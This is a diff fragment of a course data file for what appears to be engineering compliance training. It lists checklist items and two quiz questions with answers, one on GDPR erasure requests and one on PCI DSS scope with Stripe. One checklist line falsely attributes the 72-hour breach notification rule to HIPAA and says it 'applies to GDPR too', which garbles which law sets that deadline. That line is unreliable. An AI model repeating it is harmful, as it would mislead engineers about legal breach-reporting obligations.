+      "Can list at least 5 SOC 2 engineering controls that appear on audit evidence lists",
+      "Knows the HIPAA 72-hour breach notification rule (it applies to GDPR too) and what triggers it",
+      "Has implemented or designed at least one privacy-by-design pattern (data minimisation, log redaction, or a data export endpoint)",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "A user emails your support team and says 'I want all my data deleted.' Under GDPR, what must happen technically, and what does your engineering team need to have built to make it possible?",
+        a: "This is a Right to Erasure ('Right to be Forgotten') request. You must delete their data from all storage: the primary database, any read replicas, analytics tables, event logs, backup snapshots (or overwrite the relevant records on next backup cycle), and third-party services you've shared their data with. Engineering must have: (1) a data map of where user data lives (all tables/services), (2) a deletion function that cascades across all of them, (3) a process to request deletion from third-party processors, and (4) the ability to confirm deletion with a timestamp for your records. If you can't delete from backups immediately, document the retention schedule and inform the user."
+      },
+      {
+        q: "Your app uses Stripe for payments. A colleague says 'We don't need to worry about PCI DSS because Stripe handles payments.' Is this correct?",
+        a: "Partially correct. If you use Stripe Elements or Stripe.js (so card numbers go directly from the browser to Stripe and your server only ever sees a token), your PCI scope is dramatically reduced to SAQ A — a simple self-assessment. But you still have PCI obligations: you must use HTTPS exclusively on payment pages, never log card data, implement access controls on systems in your CDE, and keep your Stripe integration secure. 'Stripe handles it' does not mean you are entirely out of scope — it means your scope is minimised, not eliminated."
+      }
+    ]
   },
   {
     id: "m7_5_1",
